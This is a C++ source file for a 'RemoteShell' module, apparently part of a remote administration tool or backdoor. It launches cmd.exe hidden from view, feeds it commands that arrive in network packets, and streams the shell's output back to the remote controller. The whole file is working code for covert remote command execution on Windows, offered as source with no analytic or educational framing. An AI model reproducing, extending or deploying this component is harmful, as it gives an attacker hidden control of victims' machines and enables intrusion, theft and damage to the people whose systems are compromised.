#include "RemoteShell.h"



HANDLE RemoteShell::m_stdinRd = nullptr;
HANDLE RemoteShell::m_stdinWr = nullptr;
HANDLE RemoteShell::m_stdoutRd = nullptr;
HANDLE RemoteShell::m_stdoutWr = nullptr;


RemoteShell::RemoteShell() : m_hThreadProc(nullptr)
{
	
	GetSystemDirectory(m_cmdPath, MAX_PATH);
	strcat_s(m_cmdPath, "\\cmd.exe");
	SecureZeroMemory(&m_pi, sizeof(m_pi));
}

RemoteShell::~RemoteShell()
{
	if(IsCmdProcessIsRunning())
	{
		DWORD dwExit = 0;
		TerminateThread(m_hThreadProc, dwExit);		
		TerminateProcess(m_pi.hProcess, dwExit);
	}

	CloseHandle(m_hThreadProc);
	CloseHandle(m_stdinRd);
	CloseHandle(m_stdinWr);
	CloseHandle(m_stdoutRd);
	CloseHandle(m_stdoutWr);

}

int RemoteShell::FunctionIdentity() 
{ 
	return _remoteShell;
}

void RemoteShell::ProcessPacket(PACKET * packet)
{
	switch (packet->_header.subCommand) 
	{
		case startshell: 
		{
			Start();
			break;
		}
		case stopshell: 
		{
			Stop();
			break;
		}
		case restartshell: 
		{
			Stop();
			Start();
			break;
		}
		case command: 
		{
			if (packet->dwDataSize > 0)
			{
				Write((char*)packet->data);
			}
			break;
		}
		default:
		{
			break;
		}
	}
	freePacket(packet);

}

void RemoteShell::Start()
{
	if(IsCmdProcessIsRunning()) 
	{
		return; 
	}
	if(CreateIOPipes() == false || CreateSuspendedCMDProcess() == false) 
	{
		return;
	}

	packetBuilder *b = new packetBuilder(_remoteShell, startshell);
	b->FinalizePacket();
	//m_sendSerializedPacketCallback(b->GetSerializedPacket(), b->GetPacketSize());
	SendPacketCallback(b);
	m_hThreadProc = CreateThread(nullptr, 0, static_cast<LPTHREAD_START_ROUTINE>(ReadPipeThread), this, 0, nullptr);
}

bool RemoteShell::IsCmdProcessIsRunning() const
{
	DWORD dwexitcode;
	GetExitCodeProcess(m_pi.hProcess, &dwexitcode);     
	if (dwexitcode != STILL_ACTIVE)
	{
		return false;
	}
	return true;
}

bool RemoteShell::CreateIOPipes()
{
	// Set up the security attributes structure
	SECURITY_ATTRIBUTES sa =  
	{
		sizeof(SECURITY_ATTRIBUTES), nullptr, true
	};	  

	// create child stdout pipe.
	if (!CreatePipe(&m_stdoutRd, &m_stdoutWr, &sa, 0)) 
	{
		return false;
	}

	// create child stdin pipe
	if (!CreatePipe(&m_stdinRd, &m_stdinWr, &sa, 0)) 
	{
		return false;
	}

	return true;
}

bool RemoteShell::CreateSuspendedCMDProcess()
{
	GetStartupInfo(&m_si);
	m_si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    m_si.wShowWindow = SW_HIDE;
    m_si.hStdOutput = m_stdoutWr;
    m_si.hStdError = m_stdoutWr;                                                                                              
    m_si.hStdInput = m_stdinRd;

	if(!CreateProcess(m_cmdPath, nullptr, nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &m_si, &m_pi))
	{
		return false;
	}

	return true;
}

DWORD WINAPI RemoteShell::ReadPipeThread(LPVOID param)
{	
	RemoteShell *pthis = static_cast<RemoteShell*>(param);

	while(true)
	{
		Sleep(100);
		if(!pthis->IsCmdProcessIsRunning()) 
		{
			break;
		}

		DWORD dwAvailable = 0;
		PeekNamedPipe(pthis->m_stdoutRd, NULL, 0, NULL, &dwAvailable, NULL);

		if (dwAvailable != 0 && dwAvailable < 8192) 
		{
			try 
			{
				std::unique_ptr<char[]> buffer(new char[dwAvailable + 1]);
				std::unique_ptr<char[]> buffer_0(new char[dwAvailable + 1]);

				SecureZeroMemory(buffer.get(), dwAvailable + 1);
				SecureZeroMemory(buffer_0.get(), dwAvailable + 1);

				DWORD dwbyteRd;
				PeekNamedPipe(pthis->m_stdoutRd, buffer.get(), dwAvailable, &dwbyteRd, NULL, NULL);
				ReadFile(pthis->m_stdoutRd, buffer.get(), dwAvailable, &dwbyteRd, NULL);
				OemToCharBuff(buffer.get(), buffer_0.get(), dwAvailable);

				string output = string(buffer_0.get());

				packetBuilder *b = new packetBuilder(_remoteShell, command);
				b->WriteData((unsigned char*)output.c_str(), output.length(), _string);
				b->FinalizePacket();
				//pthis->m_sendSerializedPacketCallback(b->GetSerializedPacket(), b->GetPacketSize());
				pthis->SendPacketCallback(b);

			}
			catch(...) 
			{
				// Error   ? 
			}
		}
	}
	return 1;
}

void RemoteShell::Write(char * data) const
{
	if(IsCmdProcessIsRunning()) 
	{
		DWORD dwWritted;
		try 
		{
			int len = strlen(data);
			char * nl = "\n"; // eg the enter key
			int nllen = strlen(nl);
			WriteFile(m_stdinWr, data, len, &dwWritted, NULL);
			WriteFile(m_stdinWr, nl, nllen, &dwWritted, NULL);
		}
		catch (...) 
		{
			// error	? 
		}	
	}
}

void RemoteShell::Stop() const
{
	if(IsCmdProcessIsRunning()) 
	{
		if(TerminateProcess(m_pi.hProcess, 1)) 
		{
		
			packetBuilder *b = new packetBuilder(_remoteShell, stopshell);
			b->FinalizePacket();
//			m_sendSerializedPacketCallback(b->GetSerializedPacket(), b->GetPacketSize());
			SendPacketCallback(b);

			CloseHandle(m_hThreadProc);
			CloseHandle(m_stdinRd);
			CloseHandle(m_stdinWr);
			CloseHandle(m_stdoutRd);
			CloseHandle(m_stdoutWr);
		}

	}
}
